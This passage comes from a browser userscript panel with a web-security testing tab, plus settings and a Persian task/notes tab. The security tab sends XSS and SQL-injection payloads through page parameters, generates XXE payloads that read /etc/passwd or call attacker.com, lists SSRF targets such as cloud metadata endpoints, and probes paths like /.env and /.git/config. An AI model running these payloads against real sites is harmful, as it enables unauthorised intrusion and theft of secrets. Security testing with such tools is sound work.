Analyze</button><div id="sslResult" style="font-size:11px;"></div></div><div class="bi-card"><h4>✏️ Request Modifier</h4><label>URL regex</label><input id="modUrl" placeholder=".*" style="margin-bottom:4px;"><label>Header name</label><input id="modHN" placeholder="X-Custom-Header" style="margin-bottom:4px;"><label>Header value</label><input id="modHV" placeholder="value" style="margin-bottom:8px;"><div class="bi-row"><button id="applyMod" class="bi-btn-blue" style="flex:1;">Apply</button><button id="resetMod" class="bi-btn-red" style="flex:1;">Reset</button></div><div id="modStatus" class="bi-status"></div></div></div></div>`;
        D.getElementById("startAuth").onclick=()=>{ const hn=D.getElementById("authHN").value.trim(), hv=D.getElementById("authHV").value.trim(); if(!hv){ D.getElementById("authStatus").textContent="⚠ Value required."; return; } S.authHName=hn; S.authHVal=hv; S.authActive=true; applyAuthInjection(); D.getElementById("authStatus").className="bi-status bi-ok"; D.getElementById("authStatus").textContent="✅ Injection active."; }; D.getElementById("stopAuth").onclick=()=>{ S.authActive=false; D.getElementById("authStatus").className="bi-status bi-muted"; D.getElementById("authStatus").textContent="⏹ Stopped."; }; D.getElementById("prefToggle").onchange=function(){ S.preventPre=this.checked; if(this.checked) applyPreflightPrevention(); D.getElementById("prefStatus").textContent=this.checked?"✅ Active":""; D.getElementById("prefStatus").className="bi-status "+(this.checked?"bi-ok":""); }; D.getElementById("analyzeHdrs").onclick=async()=>{ const res=D.getElementById("sslResult"); res.innerHTML="⏳ Analyzing..."; try{ const r=await fetch(location.href,{method:"HEAD"}); const checks=[{n:"HSTS",h:"strict-transport-security"},{n:"CSP",h:"content-security-policy"},{n:"X-Frame-Options",h:"x-frame-options"},{n:"X-Content-Type-Options",h:"x-content-type-options"},{n:"X-XSS-Protection",h:"x-xss-protection"},{n:"Referrer-Policy",h:"referrer-policy"},{n:"Permissions-Policy",h:"permissions-policy"}]; res.innerHTML=checks.map(c=>{ const v=r.headers.get(c.h); return `<div style="margin-bottom:3px;display:flex;justify-content:space-between;"><span style="color:#8b949e;">${c.n}</span><span style="color:${v?"#3fb950":"#f85149"};font-size:11px;">${v?"✅ "+v.substring(0,40):"❌ Missing"}</span></div>`; }).join(""); }catch(e){ res.textContent="❌ "+e.message; } }; let modOrig=W.fetch, modActive=false; D.getElementById("applyMod").onclick=()=>{ if(modActive) return; const p=D.getElementById("modUrl").value.trim(), hn=D.getElementById("modHN").value.trim(), hv=D.getElementById("modHV").value.trim(); if(!hn){ D.getElementById("modStatus").textContent="⚠ Header name required."; return; } let rx; try{ rx=new RegExp(p); }catch(e){ D.getElementById("modStatus").textContent="❌ Invalid regex."; return; } modActive=true; W.fetch=function(...a){ const url=typeof a[0]==="string"?a[0]:a[0].url; if(rx.test(url)){ const h=new Headers((a[1]||{}).headers||{}); h.set(hn,hv); return modOrig(a[0],{...a[1],headers:h}); } return modOrig.apply(this,a); }; D.getElementById("modStatus").className="bi-status bi-ok"; D.getElementById("modStatus").textContent="✅ Applied."; }; D.getElementById("resetMod").onclick=()=>{ if(modActive){ W.fetch=modOrig; modActive=false; D.getElementById("modStatus").textContent="🔄 Reset."; } };
      } else if(tab==="Security"){
        const XSS_P=["<script>alert(1)<\/script>",'"><img src=x onerror=alert(1)>',"'><svg/onload=alert(1)>","<body onload=alert(1)>",'"-alert(1)-"']; const SQLI_P=["'",'\"',"' OR '1'='1",'" OR "1"="1',"' OR 1=1--","1 UNION SELECT null--","' AND SLEEP(3)--"]; const SQLI_E=["sql syntax","mysql_fetch","ora-","sqlite_","pg_query","syntax error","odbc driver"]; c.innerHTML=`<div class="bi-grid2"><div><div class="bi-card"><h4>💉 ${T("XSS Scanner")}</h4><button id="scanXSS" class="bi-btn-red" style="width:100%;">🔍 ${T("Scan")}</button><div id="xssRes" class="bi-scroll bi-status" style="max-height:100px;margin-top:6px;"></div></div><div class="bi-card"><h4>🗄 ${T("SQLi Scanner")}</h4><button id="scanSQLi" class="bi-btn-red" style="width:100%;">🔍 ${T("Scan")}</button><div id="sqliRes" class="bi-scroll bi-status" style="max-height:100px;margin-top:6px;"></div></div><div class="bi-card"><h4>🖼 ${T("Clickjacking")}</h4><button id="scanCJ" class="bi-btn-dim" style="width:100%;">🔍 ${T("Scan")}</button><div id="cjRes" class="bi-status" style="margin-top:6px;"></div></div><div class="bi-card"><h4>📝 ${T("HTML Injection")}</h4><button id="scanHTML" class="bi-btn-dim" style="width:100%;">🔍 ${T("Scan")}</button><div id="htmlRes" class="bi-scroll bi-status" style="max-height:80px;margin-top:6px;"></div></div></div><div><div class="bi-card"><h4>📄 ${T("XXE Payloads")}</h4><button id="genXXE" class="bi-btn-dim" style="width:100%;margin-bottom:6px;">📋 Generate</button><div id="xxeRes" class="bi-code" style="max-height:80px;"></div></div><div class="bi-card"><h4>🌐 ${T("SSRF Payloads")}</h4><button id="genSSRF" class="bi-btn-dim" style="width:100%;margin-bottom:6px;">📋 Generate</button><div id="ssrfRes" class="bi-code" style="max-height:80px;"></div></div><div class="bi-card"><h4>🌍 ${T("Subdomain Takeover")}</h4><input id="subTarget" value="${location.hostname}" style="margin-bottom:6px;"><button id="scanSub" class="bi-btn-dim" style="width:100%;">🔍 ${T("Scan")}</button><div id="subRes" class="bi-status" style="margin-top:6px;"></div></div><div class="bi-card"><h4>📂 ${T("Directory BF")}</h4><input id="dirTarget" value="${location.origin}" style="margin-bottom:6px;"><div class="bi-row"><button id="scanDir" class="bi-btn-dim" style="flex:1;">🔍 Scan</button><button id="stopDir" class="bi-btn-red" style="flex:1;">⏹ Stop</button></div><div id="dirRes" class="bi-scroll bi-code" style="max-height:120px;margin-top:6px;"></div></div></div></div>`;
        const scanParams = async (payloads, checkFn, resId, stopId) => { const res=D.getElementById(resId); res.innerHTML="⏳ "+T("Scanning..."); const url=new URL(location.href); const params=[...url.searchParams.entries()]; if(!params.length){ res.innerHTML=`<span class="bi-warn">ℹ ${T("No params")}</span>`; return; } let found=[]; for(const [k] of params){ for(const p of payloads){ const tu=new URL(location.href); tu.searchParams.set(k,p); try{ const r=await fetch(tu.toString(),{credentials:"same-origin"}); const t=await r.text(); if(checkFn(t,p)){ found.push({param:k,payload:p.substring(0,50)}); break; } }catch(e){} } } res.innerHTML=found.length?found.map(f=>`<div style="color:#f85149;">⚠ <b>${f.param}</b>: ${T("Vulnerable")}<br><small>${f.payload}</small></div>`).join(""):params.map(([k])=>`<div style="color:#3fb950;">✅ ${k}: ${T("Protected")}</div>`).join(""); }; D.getElementById("scanXSS").onclick=()=>scanParams(XSS_P,(t,p)=>t.includes(p),"xssRes"); D.getElementById("scanSQLi").onclick=()=>scanParams(SQLI_P,(t)=>SQLI_E.some(e=>t.toLowerCase().includes(e)),"sqliRes"); D.getElementById("scanHTML").onclick=()=>scanParams(["<h1>HTMLI</h1>","<b>injected</b>"],(t,p)=>t.includes(p),"htmlRes"); D.getElementById("scanCJ").onclick=async()=>{ const res=D.getElementById("cjRes"); res.innerHTML="⏳..."; try{ const r=await fetch(location.href,{method:"HEAD"}); const xfo=r.headers.get("x-frame-options"); const csp=r.headers.get("content-security-policy")||""; const vuln=!xfo&&!csp.includes("frame-ancestors"); res.innerHTML=`<div>X-Frame-Options: ${xfo?`<span style="color:#3fb950;">${xfo}</span>`:'<span style="color:#f85149;">NOT SET</span>'}</div><div>CSP frame-ancestors: ${csp.includes("frame-ancestors")?'<span style="color:#3fb950;">✅</span>':'<span style="color:#f85149;">❌</span>'}</div><div style="margin-top:4px;font-weight:bold;color:${vuln?"#f85149":"#3fb950"};">${vuln?T("Vulnerable"):T("Protected")}</div>`; }catch(e){ res.textContent="❌ "+e.message; } }; D.getElementById("genXXE").onclick=()=>{ D.getElementById("xxeRes").textContent=[`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><root>&xxe;</root>`,`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>`].join("\n\n"); }; D.getElementById("genSSRF").onclick=()=>{ D.getElementById("ssrfRes").textContent=["http://127.0.0.1/","http://localhost/","http://169.254.169.254/","http://169.254.169.254/latest/meta-data/","http://[::1]/","file:///etc/passwd","dict://127.0.0.1:11211/stat","http://metadata.google.internal/computeMetadata/v1/"].join("\n"); }; D.getElementById("scanSub").onclick=async()=>{ const res=D.getElementById("subRes"); res.innerHTML="⏳..."; const target=D.getElementById("subTarget").value.trim(); if(S.kernelOnline){ try{ const r=await kernelFetch("/scan/subdomains",{method:"POST",body:JSON.stringify({domain:target})}); const d=await r.json(); res.innerHTML=`<div style="color:#3fb950;">✅ ${d.alive_count} alive subdomains</div>`+d.alive.map(a=>`<div style="color:#58a6ff;">${a.subdomain} → ${a.ips.join(",")}</div>`).join("")+d.cname_risk.map(a=>`<div style="color:#d29922;">⚠ ${a.subdomain} CNAME→${a.service}</div>`).join(""); return; }catch(e){} } try{ const r=await fetch(`https://dns.google/resolve?name=${target}&type=CNAME`); const d=await r.json(); const cname=(d.Answer||[]).find(a=>a.type===5)?.data||""; const services={"github.io":"GitHub Pages","herokuapp.com":"Heroku","netlify.app":"Netlify","vercel.app":"Vercel","s3.amazonaws.com":"AWS S3"}; if(cname){ const match=Object.entries(services).find(([k])=>cname.includes(k)); res.innerHTML=match?`<div style="color:#d29922;">⚠ CNAME → ${cname} (${match[1]}) — potential takeover!</div>`:`<div style="color:#3fb950;">✅ CNAME → ${cname} — no known risk.</div>`; }else{ res.innerHTML='<span class="bi-muted">No CNAME record.</span>'; } }catch(e){ res.textContent="❌ "+e.message; } }; dirScanStop=false; D.getElementById("scanDir").onclick=async()=>{ dirScanStop=false; const res=D.getElementById("dirRes"); const target=(D.getElementById("dirTarget").value.trim()||location.origin).replace(/\/$/,""); if(S.kernelOnline){ res.innerHTML="⏳ Using kernel scanner..."; try{ const r=await kernelFetch("/scan/directory",{method:"POST",body:JSON.stringify({target,concurrency:8})}); const d=await r.json(); res.innerHTML=`✅ Scanned ${d.scanned} paths, found ${d.found.length}:\n`+d.found.map(f=>`<span style="color:${f.status<400?"#3fb950":"#8b949e"};">[${f.status}] ${f.path}</span>`).join("\n"); return; }catch(e){} } const paths=["/admin","/login","/.env","/.git/config","/api","/config","/backup","/robots.txt","/sitemap.xml","/.htaccess","/phpMyAdmin","/wp-admin","/console","/dashboard","/api/v1","/api/v2","/secret","/test","/dev","/staging"]; res.innerHTML=`⏳ Scanning ${paths.length} paths (browser mode)...\n`; for(const path of paths){ if(dirScanStop){ res.innerHTML+="⏹ Stopped."; break; } try{ const r=await fetch(target+path,{method:"HEAD",mode:"no-cors"}); res.innerHTML+=`<span style="color:#58a6ff;">[?] ${path}</span>\n`; }catch(e){} await new Promise(r=>setTimeout(r,30)); } if(!dirScanStop) res.innerHTML+="✅ Done."; }; D.getElementById("stopDir").onclick=()=>(dirScanStop=true);
      } else if(tab==="PDF"){
        // REPLACED WITH PATCH MODULE
        biRenderPdfTab(c);
      } else if(tab==="Tasks"){
        // REPLACED WITH PATCH MODULE
        biRenderTaskNotesTab(c);
      } else if(tab==="Settings"){
        c.innerHTML=`<div class="bi-grid2"><div><div class="bi-card"><h4>🌐 ${T("UI Language")}</h4><select id="langSel" style="margin-bottom:8px;"><option value="en" ${S.uiLang==="en"?"selected":""}>English</option><option value="fa" ${S.uiLang==="fa"?"selected":""}>فارسی</option></select><button id="applyLang" class="bi-btn-blue" style="width:100%;">${T("Apply")}</button></div><div class="bi-card"><h4>🎨 ${T("Font Family")}</h4><select id="fontSel" style="margin-bottom:8px;">${FONTS.map(f=>`<option value="${f.name}" ${S.fontFamily===f.name?"selected":""}>${f.name}</option>`).join("")}</select><label>${T("Font Size")}: <b id="fsVal">${S.fontSize}</b>px</label><input type="range" id="fsSlider" min="8" max="18" value="${S.fontSize}" style="width:100%;margin-bottom:8px;" oninput="document.getElementById('fsVal').textContent=this.value;document.getElementById('bi-font-style').textContent=\`#${BS},#${BS} *{font-family:'${S.fontFamily}',Consolas,monospace!important;font-size:\${this.value}px!important;}\`"><button id="saveFont" class="bi-btn-dim" style="width:100%;">💾 Save Font</button></div><div class="bi-card"><h4>🔆 ${T("Panel Opacity")}: <b id="opVal">${S.panelOpacity}</b></h4><input type="range" id="opSlider" min="0.2" max="1" step="0.05" value="${S.panelOpacity}" style="width:100%;" oninput="document.getElementById('opVal').textContent=this.value;document.getElementById('${BS}').style.opacity=this.value;"><button id="saveOp" class="bi-btn-dim" style="width:100%;margin-top:8px;">💾 Save</button></div></div><div><div class="bi-card"><h4>🐍 ${T("Kernel URL")}</h4><input id="kernelUrlIn" value="${S.kernelUrl}" style="margin-bottom:6px;"><div class="bi-row"><button id="saveKernel" class="bi-btn-dim" style="flex:1;">💾 Save</button><button id="testKernel" class="bi-btn-blue" style="flex:1;">🔗 ${T("Test Kernel")}</button></div><div id="kernelStatus" class="bi-status ${S.kernelOnline?"bi-ok":"bi-err"}">${S.kernelOnline?T("Kernel online"):T("Kernel offline")}</div></div><div class="bi-card"><h4>⚙ Misc</h4><div class="bi-check-row"><input type="checkbox" id="ctxToggle" ${S.customCtx?"checked":""}><label for="ctxToggle">${T("Custom Right-Click")}</label></div><hr class="bi-sep"><button id="resetPos" class="bi-btn-dim" style="width:100%;margin-bottom:4px;">${T("Reset Position")}</button></div><div class="bi-card"><h4>👤 ${T("Form Profile")}</h4><label>${T("Full Name")}</label><input id="pfName" value="${S.fillProfile.name||""}" style="margin-bottom:4px;"><label>${T("Email")}</label><input id="pfEmail" value="${S.fillProfile.email||""}" style="margin-bottom:4px;"><label>${T("Phone")}</label><input id="pfPhone" value="${S.fillProfile.phone||""}" style="margin-bottom:4px;"><div class="bi-row"><button id="saveProf" class="bi-btn-blue" style="flex:1;">💾 ${T("Save Profile")}</button><button id="fillForms" class="bi-btn-orange" style="flex:1;">⚡ ${T("Fill Forms")}</button></div><div id="profStatus" class="bi-status bi-ok"></div></div></div></div>`;
        D.getElementById("applyLang").onclick=()=>{ S.uiLang=D.getElementById("langSel").value; panel.remove(); panel=null; createPanel(); }; D.getElementById("fontSel").onchange=function(){ S.fontFamily=this.value; loadFont(this.value); const fst=D.getElementById("bi-font-style"); if(fst) fst.textContent=`#${BS},#${BS} *{font-family:'${this.value}',Consolas,monospace!important;font-size:${S.fontSize}px!important;}`; }; D.getElementById("saveFont").onclick=()=>{ S.fontFamily=D.getElementById("fontSel").value; S.fontSize=parseInt(D.getElementById("fsSlider").value); }; D.getElementById("saveOp").onclick=()=>{ S.panelOpacity=parseFloat(D.getElementById("opSlider").value); }; D.getElementById("saveKernel").onclick=()=>{ S.kernelUrl=D.getElementById("kernelUrlIn").value.trim(); D.getElementById("kernelStatus").textContent="✅ Saved."; D.getElementById("kernelStatus").className="bi-status bi-ok"; }; D.getElementById("testKernel").onclick=async()=>{ S.kernelUrl=D.getElementById("kernelUrlIn").value.trim(); try{ const r=await fetch(S.kernelUrl+"/health"); S.kernelOnline=r.ok; D.getElementById("kernelStatus").textContent=r.ok?T("Kernel online"):T("Kernel offline"); D.getElementById("kernelStatus").className="bi-status "+(r.ok?"bi-ok":"bi-err"); const dot=D.getElementById("bi-kernel-dot"); if(dot) dot.style.background=r.ok?"#3fb950":"#f85149"; }catch(e){ S.kernelOnline=false; D.getElementById("kernelStatus").textContent=T("Kernel offline"); D.getElementById("kernelStatus").className="bi-status bi-err"; const dot=D.getElementById("bi-kernel-dot"); if(dot) dot.style.background="#f85149"; } }; D.getElementById("ctxToggle").onchange=function(){ S.customCtx=this.checked; }; D.getElementById("resetPos").onclick=resetPanelPos; D.getElementById("saveProf").onclick=()=>{ S.fillProfile={ name:D.getElementById("pfName").value, email:D.getElementById("pfEmail").value, phone:D.getElementById("pfPhone").value }; D.getElementById("profStatus").textContent="✅ "+T("Profile saved"); }; D.getElementById("fillForms").onclick=()=>{ const p=S.fillProfile; let ct=0; const fa=(attr,val)=>{ D.querySelectorAll("input:not([type=hidden]),textarea").forEach(inp=>{ const n=((inp.name||"")+" "+(inp.id||"")+" "+(inp.placeholder||"")).toLowerCase(); if(n.includes(attr)){ inp.value=val; inp.dispatchEvent(new Event("input",{bubbles:true})); ct++; } }); }; if(p.name) fa("name",p.name); if(p.email){ fa("email",p.email); fa("mail",p.email); } if(p.phone){ fa("phone",p.phone); fa("mobile",p.phone); fa("tel",p.phone); } D.getElementById("profStatus").textContent=`✅ ${ct} fields filled.`; };
      }
    }
    showTab(S.activeTab);
    applyFont();
  }

  // ======================= PATCH MODULE FUNCTIONS =======================

  // biFixColorTheme - color theme fix (adapted to work with existing panel ID)
  function biFixColorTheme(themeName) {
    const themes = {
      dark:  { bg:'#111113', panel:'#1c1c1f', border:'#2a2a2e', text:'#f0f0f0', sub:'#888', accent:'#3b82f6', accentH:'#2563eb' },
      light: { bg:'#f3f4f6', panel:'#ffffff', border:'#e5e7eb', text:'#111827', sub:'#6b7280', accent:'#2563eb', accentH:'#1d4ed8' },
      red:   { bg:'#0f0a0a', panel:'#1a1010', border:'#3a1a1a', text:'#f0eded', sub:'#9a7070', accent:'#ef4444', accentH:'#dc2626' },
      green: { bg:'#080f0b', panel:'#111a14', border:'#1a3020', text:'#ecf5ee', sub:'#5a8a65', accent:'#22c55e', accentH:'#16a34a' },
      purple:{ bg:'#0c0a14', panel:'#161225', border:'#2a2040', text:'#f0eeff', sub:'#7a6aaa', accent:'#a855f7', accentH:'#9333ea' },
      gold:  { bg:'#100e00', panel:'#1c1900', border:'#3a3000', text:'#f5f0dc', sub:'#9a8a50', accent:'#f59e0b', accentH:'#d97706' },
    };
    const t = themes[themeName] || themes.dark;
    const panelEl = document.getElementById(BS) || document.getElementById('bi-panel');
    if (!panelEl) return;
    const root = panelEl.style;
    root.setProperty('--bi-bg', t.bg);
    root.setProperty('--bi-panel', t.panel);
    root.setProperty('--bi-border', t.border);
    root.setProperty('--bi-text', t.text);
    root.setProperty('--bi-sub', t.sub);
    root.setProperty('--bi-accent', t.accent);
    root.setProperty('--bi-accentH', t.accentH);
    GM_setValue('bi_theme', themeName);
  }

  // biRenderTaskNotesTab - Tasks & Notes tab (replacement)
  function biRenderTaskNotesTab(container) {
    if (!document.getElementById('bi-tn-style')) {
      const s = document.createElement('style');
      s.id = 'bi-tn-style';
      s.textContent = `
        .bi-tn { display:flex; flex-direction:column; height:100%; direction:rtl; font-family:'Vazirmatn','Tahoma',sans-serif; }
        .bi-tn-tabs { display:flex; gap:6px; padding:10px 10px 0; flex-shrink:0; }
        .bi-tn-tab { flex:1; padding:9px; border-radius:10px; border:none; cursor:pointer; font-size:13px; font-weight:700; display:flex; align-items:center; justify-content:center; gap:5px; transition:all .2s; }
        .bi-tn-tab.notes-t { background:#1f1900; color:#b87e00; }
        .bi-tn-tab.notes-t.on { background:#f59e0b; color:#fff; box-shadow:0 2px 12px #f59e0b55; }
        .bi-tn-tab.tasks-t { background:#0d1f36; color:#4a90d9; }
        .bi-tn-tab.tasks-t.on { background:#3b82f6; color:#fff; box-shadow:0 2px 12px #3b82f655; }
        .bi-tn-bar { display:flex; align-items:center; gap:5px; padding:7px 10px; flex-shrink:0; }
        .bi-tn-icon { width:30px; height:30px; border-radius:8px; border:none; background:#22222a; color:#888; cursor:pointer; display:flex; align-items:center; justify-content:center; font-size:14px; transition:all .15s; flex-shrink:0; }
        .bi-tn-icon:hover { background:#2e2e38; color:#ddd; }
        .bi-tn-icon.on { background:#1a2a40; color:#3b82f6; border:1px solid #3b82f633; }
        .bi-tn-search { flex:1; background:#1c1c24; border:1px solid #2e2e3a; border-radius:9px; color:#eee; padding:6px 11px; font-size:12px; outline:none; direction:rtl; transition:.15s; }
        .bi-tn-search:focus { border-color:#3b82f6; }
        .bi-tn-badge { font-size:10px; padding:2px 8px; border-radius:20px; background:#1a2a40; color:#5ba8ff; border:1px solid #3b82f633; white-space:nowrap; }
        .bi-tn-panel { background:#161620; border:1px solid #2a2a35; border-radius:12px; padding:12px; margin:0 10px 6px; flex-shrink:0; }
        .bi-tn-plabel { font-size:11px; color:#888; margin-bottom:8px; display:flex; align-items:center; gap:5px; font-weight:600; }
        .bi-tn-chips { display:flex; gap:5px; flex-wrap:wrap; }
        .bi-tn-chip { padding:5px 11px; border-radius:20px; background:#22222a; border:1px solid #2e2e3a; color:#aaa; font-size:12px; cursor:pointer; transition:all .15s; white-space:nowrap; }
        .bi-tn-chip:hover { border-color:#444; color:#eee; }
        .bi-tn-chip.on { background:#0d1f36; border-color:#3b82f6; color:#5ba8ff; }
        .bi-tn-radio { display:flex; align-items:center; gap:8px; padding:6px 0; cursor:pointer; color:#ccc; font-size:13px; }
        .bi-tn-radio input { accent-color:#3b82f6; width:15px; height:15px; }
        .bi-tn-danger { display:flex; align-items:center; gap:7px; padding:7px 8px; border-radius:8px; cursor:pointer; color:#ff5555; font-size:12px; transition:.15s; }
        .bi-tn-danger:hover { background:#1a0808; }
        .bi-tn-body { flex:1; overflow-y:auto; padding:0 10px; }
        .bi-tn-body::-webkit-scrollbar { width:4px; }
        .bi-tn-body::-webkit-scrollbar-thumb { background:#2e2e3a; border-radius:4px; }
        .bi-tn-empty { display:flex; flex-direction:column; align-items:center; justify-content:center; gap:10px; padding:30px 20px; text-align:center; }
        .bi-tn-empty-ico { font-size:50px; opacity:.35; filter:grayscale(.3); }
        .bi-tn-empty-ttl { font-size:15px; font-weight:700; color:#ddd; }
        .bi-tn-empty-sug { font-size:12px; color:#f59e0b; font-weight:600; }
        .bi-tn-empty ul { list-style:disc; padding-right:18px; text-align:right; margin:0; }
        .bi-tn-empty li { font-size:12px; color:#666; margin:4px 0; cursor:pointer; transition:.1s; }
        .bi-tn-empty li:hover { color:#aaa; }
        .bi-task-card { background:#18181f; border:1px solid #26262e; border-radius:12px; padding:12px 13px; margin-bottom:7px; transition:all .15s; }
        .bi-task-card:hover { border-color:#3b82f633; }
        .bi-task-card.done-card { opacity:.55; }
        .bi-task-top { display:flex; align-items:flex-start; gap:10px; }
        .bi-task-check { width:20px; height:20px; border-radius:50%; border:2px solid #444; background:transparent; cursor:pointer; flex-shrink:0; display:flex; align-items:center; justify-content:center; transition:all .2s; margin-top:1px; }
        .bi-task-check:hover { border-color:#3b82f6; }
        .bi-task-check.done-c { background:#22c55e; border-color:#22c55e; color:#fff; font-size:11px; }
        .bi-task-text { flex:1; font-size:13px; color:#eee; line-height:1.5; word-break:break-word; }
        .bi-task-text.done-t { text-decoration:line-through; color:#555; }
        .bi-task-btns { display:flex; gap:3px; opacity:0; transition:.15s; }
        .bi-task-card:hover .bi-task-btns { opacity:1; }
        .bi-task-ibtn { width:25px; height:25px; border-radius:6px; border:none; background:#22222a; color:#888; cursor:pointer; font-size:12px; display:flex; align-items:center; justify-content:center; transition:.15s; }
        .bi-task-ibtn:hover { background:#2e2e38; color:#ddd; }
        .bi-task-ibtn.del:hover { background:#2a0808; color:#ff5555; }
        .bi-task-meta { display:flex; gap:5px; margin-top:8px; flex-wrap:wrap; align-items:center; }
        .bi-pri { font-size:10px; padding:2px 8px; border-radius:20px; font-weight:700; }
        .bi-pri.high   { background:#2a0808; color:#ff6b6b; }
        .bi-pri.medium { background:#2a1a00; color:#fb923c; }
        .bi-pri.low    { background:#0a2a12; color:#4ade80; }
        .bi-due { font-size:11px; color:#666; display:flex; align-items:center; gap:3px; }
        .bi-due.late { color:#ff5555; }
        .bi-lbl { font-size:10px; padding:2px 8px; border-radius:20px; background:#0d1f36; color:#5ba8ff; }
        .bi-note-card { background:#18181f; border:1px solid #26262e; border-radius:12px; padding:12px 13px; margin-bottom:7px; transition:all .15s; cursor:pointer; }
        .bi-note-card:hover { border-color:#f59e0b44; }
        .bi-note-head { display:flex; align-items:flex-start; justify-content:space-between; gap:8px; }
        .bi-note-ttl { font-size:13px; color:#eee; font-weight:600; flex:1; }
        .bi-note-prev { font-size:12px; color:#666; line-height:1.5; margin-top:5px; overflow:hidden; display:-webkit-box; -webkit-line-clamp:2; -webkit-box-orient:vertical; }
        .bi-note-date { font-size:10px; color:#444; margin-top:7px; }
        .bi-tn-footer { padding:8px 10px; border-top:1px solid #1e1e28; flex-shrink:0; }
        .bi-tn-inp-row { display:flex; align-items:center; gap:7px; }
        .bi-tn-inp { flex:1; background:#1c1c24; border:1px solid #2e2e3a; border-radius:10px; color:#fff; padding:9px 12px; font-size:13px; outline:none; direction:rtl; transition:.15s; }
        .bi-tn-inp:focus { border-color:#3b82f6; }
        .bi-tn-inp.note-inp:focus { border-color:#f59e0b; }
        .bi-tn-add { padding:8px 14px; border-radius:9px; border:none; cursor:pointer; font-size:13px; font-weight:700; white-space:nowrap; transition:all .15s; }
        .bi-tn-add.task-add { background:#3b82f6; color:#fff; }
        .bi-tn-add.task-add:hover { background:#2563eb; }
        .bi-tn-add.note-add { background:#f59e0b; color:#fff; }
        .bi-tn-add.note-add:hover { background:#d97706; }
        .bi-task-xp { background:#161620; border:1px solid #2a2a35; border-radius:12px; padding:11px 12px; margin-bottom:6px; }
        .bi-task-xp textarea { width:100%; background:transparent; border:none; color:#eee; font-size:13px; resize:none; outline:none; direction:rtl; min-height:55px; font-family:inherit; line-height:1.5; }
        .bi-task-xp-btns { display:flex; gap:6px; flex-wrap:wrap; margin-top:8px; align-items:center; }
        .bi-task-xp-btn { padding:4px 10px; border-radius:7px; background:#22222a; border:1px solid #2e2e3a; color:#aaa; font-size:11px; cursor:pointer; transition:.15s; }
        .bi-task-xp-btn:hover { color:#eee; border-color:#444; }
        .bi-task-xp-btn.on { background:#0d1f36; border-color:#3b82f6; color:#5ba8ff; }
        .bi-task-xp-sub { padding:7px 16px; background:#3b82f6; color:#fff; border:none; border-radius:8px; font-size:13px; font-weight:700; cursor:pointer; margin-right:auto; }
        .bi-task-xp-sub:hover { background:#2563eb; }
        .bi-due-input { padding:4px 8px; background:#22222a; border:1px solid #2e2e3a; color:#ccc; border-radius:7px; font-size:11px; outline:none; }
      `;
      document.head.appendChild(s);
    }

    let activeTab = GM_getValue('bi_tn_active', 'tasks');
    let tasks     = JSON.parse(GM_getValue('bi_tasks_v3', '[]'));
    let notes     = JSON.parse(GM_getValue('bi_notes_v3', '[]'));

    let filter    = { due:'', pri:'', labels:[] };
    let sortBy    = 'created';
    let showDone  = false;
    let showFP    = false;
    let showSP    = false;
    let showMore  = false;
    let noteQ     = '';
    let addingTask= false;
    let newDue    = '';
    let newPri    = '';
    let newLabels = [];

    const saveTasks = () => GM_setValue('bi_tasks_v3', JSON.stringify(tasks));
    const saveNotes = () => GM_setValue('bi_notes_v3', JSON.stringify(notes));
    const uid = () => Date.now().toString(36) + Math.random().toString(36).slice(2,6);
    const fmtDate = ts => ts ? new Date(ts).toLocaleDateString('fa-IR') : '';
    const isToday = ts => { const d=new Date(ts),n=new Date(); return d.toDateString()===n.toDateString(); };
    const isWeek  = ts => { const d=new Date(ts),n=new Date(); const s=new Date(n); s.setDate(n.getDate()-n.getDay()); const e=new Date(s); e.setDate(s.getDate()+7); return d>=s&&d<=e; };
    const isPast  = ts => ts < Date.now();

    function getFiltered() {
      let list = [...tasks];
      if (!showDone) list = list.filter(t => !t.done);
      if (filter.due==='today') list = list.filter(t=>t.due&&isToday(t.due));
      else if (filter.due==='week') list = list.filter(t=>t.due&&isWeek(t.due));
      else if (filter.due==='past') list = list.filter(t=>t.due&&isPast(t.due)&&!isToday(t.due));
      else if (filter.due==='none') list = list.filter(t=>!t.due);
      if (filter.pri) list = list.filter(t=>t.pri===filter.pri);
      if (filter.labels.length) list = list.filter(t=>(t.labels||[]).some(l=>filter.labels.includes(l)));
      if (sortBy==='due')     list.sort((a,b)=>(a.due||9e15)-(b.due||9e15));
      else if (sortBy==='pri') list.sort((a,b)=>(({high:0,medium:1,low:2}[a.pri]??3))-({high:0,medium:1,low:2}[b.pri]??3));
      else                     list.sort((a,b)=>b.created-a.created);
      return list;
    }

    function getAllLabels() {
      const s = new Set(); tasks.forEach(t=>(t.labels||[]).forEach(l=>s.add(l))); return [...s];
    }

    const hasFilter = () => filter.due||filter.pri||filter.labels.length;

    function render() {
      const filtered = activeTab==='tasks' ? getFiltered() : notes.filter(n=>
        !noteQ || n.title.toLowerCase().includes(noteQ) || (n.body||'').toLowerCase().includes(noteQ)
      );
      const labels = getAllLabels();

      container.innerHTML = `<div class="bi-tn">
        <div class="bi-tn-tabs">
          <button class="bi-tn-tab notes-t ${activeTab==='notes'?'on':''}" data-act="tab-notes">📋 یادداشت</button>
          <button class="bi-tn-tab tasks-t ${activeTab==='tasks'?'on':''}" data-act="tab-tasks">☑️ دست‌نویس</button>
        </div>
        <div class="bi-tn-bar">
          ${activeTab==='tasks' ? `
            <button class="bi-tn-icon ${showMore?'on':''}" title="بیشتر" data-act="more">···</button>
            <button class="bi-tn-icon" title="پنهان/نمایش انجام‌شده" data-act="done">${showDone?'👁':'🚫'}</button>
            <button class="bi-tn-icon ${showFP?'on':''}" title="فیلتر" data-act="filter">⚙</button>
            <button class="bi-tn-icon ${showSP?'on':''}" title="ترتیب" data-act="sort">↕</button>
            ${hasFilter() ? '<span class="bi-tn-badge">فیلتر فعال</span>' : ''}
          ` : `
            <button class="bi-tn-icon" title="بیشتر" data-act="moreN">···</button>
            <input class="bi-tn-search" placeholder="جستجو در یادداشت‌ها..." value="${noteQ}" data-act="search">
          `}
        </div>
        ${activeTab==='tasks'&&showSP?`<div class="bi-tn-panel">
          <div class="bi-tn-plabel">↕ ترتیب نمایش</div>
          ${[['created','تاریخ ساخت'],['due','تاریخ سررسید'],['pri','اولویت']].map(([v,l])=>`<label class="bi-tn-radio"><input type="radio" name="bi-sort" value="${v}" ${sortBy===v?'checked':''}> ${l}</label>`).join('')}
        </div>`:''}
